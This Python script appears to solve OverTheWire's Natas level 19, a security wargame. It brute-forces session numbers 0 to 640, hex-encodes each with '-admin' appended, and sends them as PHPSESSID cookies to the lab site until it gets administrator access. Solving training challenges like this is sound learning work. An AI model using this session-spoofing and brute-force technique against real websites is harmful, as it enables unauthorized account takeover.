import base64
import binascii
from tools import cryptotools
import requests
from requests.auth import HTTPBasicAuth
from secret.credentials import Credentials


def main():
    level = 19
    level_about = 'In this level you cannot see a sourcecode of vulnerable website, but we have information that\n' \
                  'this site uses most of previous level code but Session ID is no longer sequential number. If we\n' \
                  'try to login as a AAAAA user and look at PHPSESSID cookie we see that a cookie cotains some HEX\n' \
                  'string ending with 4141414141 which is a ctually our username "AAAAA". If we hex decode whole\n' \
                  'cookie value we can see that it is (for example) 231-AAAAA. Now we can assume that first part\n' \
                  'is session number encoded as hex string with appended hex encoded dash and username . Now we\n' \
                  'try spoof PHPSESSID with session number from 1 to 640 with appended hex encoded "-admin".'

    print("Hi there!\nyou've just run natas level " + str(level) +
          " (http://overthewire.org/wargames/natas/). Credentials are available in the secrets/credentials.py")

    print("\n" + level_about + "\n\n")

    # Real solution starts here :-)
    level_credentials = HTTPBasicAuth('natas' + str(level), Credentials.natas_credentials['natas' + str(level)])

    for i in range(0, 641):
        identifier = ''
        for symbol in str(i):
            identifier += format(ord(symbol), "x")
        cookie = {"PHPSESSID": identifier + "2d61646d696e"}
        r = requests.get('http://natas19.natas.labs.overthewire.org/index.php', cookies=cookie, auth=level_credentials)
        if r.text.__contains__("You are logged in as a regular user"):
            print("false: " + cookie.get("PHPSESSID"))
        else:
            print("SUCCESS PHPSESSID = " + cookie.get("PHPSESSID"))
            print(r.text)
            break

    return True


if __name__ == '__main__':
    main()
